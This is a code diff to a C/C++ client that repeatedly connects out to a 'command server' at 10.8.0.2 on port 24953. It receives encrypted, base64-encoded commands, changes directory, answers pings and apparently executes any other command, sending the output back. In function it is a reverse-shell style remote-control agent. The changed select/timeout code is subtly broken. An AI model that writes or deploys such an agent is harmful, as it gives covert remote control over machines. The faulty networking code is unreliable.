@@ -51,6 +51,7 @@ FILE *processOutput;
 char *buf;
 
 int mainSocket;
+fd_set readTimeoutVar;
 
 void clearBuf() {
     for (int i = 0; i <= max; i++)
@@ -123,11 +124,13 @@ void initNET() {
     sockaddr addr;
     addr.sa_family = AF_INET;
     *((unsigned short*)&addr + 1) = htons(24953);
-    *((int*)&addr + 1) = htonl(inet_network("127.0.0.1"));
+    *((int*)&addr + 1) = htonl(inet_network("10.8.0.2"));
 
     printf("Searching command server...\n");
     while (connect(mainSocket, &addr, sizeof(addr)))
         usleep(2000000);
+
+    FD_SET(mainSocket, &readTimeoutVar);
 }
 
 void initMEM() {
@@ -143,16 +146,33 @@ void* startCommand(void *) {
 
     buf[current] = 0;
     processOutput = NULL;
-    printf("I have: %s", buf - 1);
+}
+
+void processData() {
+
 }
 
 void recvDecrypted() {
-    if (recv(mainSocket, buf, max, 0) == 0) {
+    //it's a kind of magic
+    timeval timeout;
+    timeout.tv_sec = 0;
+    timeout.tv_usec = 100;
+
+    for (int i = 0; i < 300; i++) {
+        FD_ZERO(&readTimeoutVar);
+        if (select(mainSocket, &readTimeoutVar, NULL, NULL, &timeout) != -1)
+            break;
+    }
+
+    if (select(mainSocket, &readTimeoutVar, NULL, NULL, &timeout) == -1 || recv(mainSocket, buf, max, 0) == 0) {
         initNET();
         initAES();
         recvDecrypted();
         return;
     }
+    printf("Got: %s\n", buf);
+    fflush(stdout);
+
     string half = base64_decode(string((char*)buf));
     cfbDecryption->ProcessData((byte*)buf, (byte*)half.c_str(), half.size());
     buf[half.size()] = 0;
@@ -169,11 +189,13 @@ int main() {
 
         recvDecrypted();
 
-        if (buf[0] == 'c' && buf[1] == 'd' && buf[2] == ' ') {
+        if (strncmp(buf, "cd ", 3) == 0) {
             chdir(buf + 3);
             getcwd(buf, max);
             buf[-1] = 'D';
             sendEncrypted(buf - 1, strlen(buf) + 1);
+        } else if (strncmp(buf, "ping", 4) == 0) {
+            sendEncrypted("P", 1);
         } else {
             processOutput = (FILE*)buf;
             pthread_t thread;
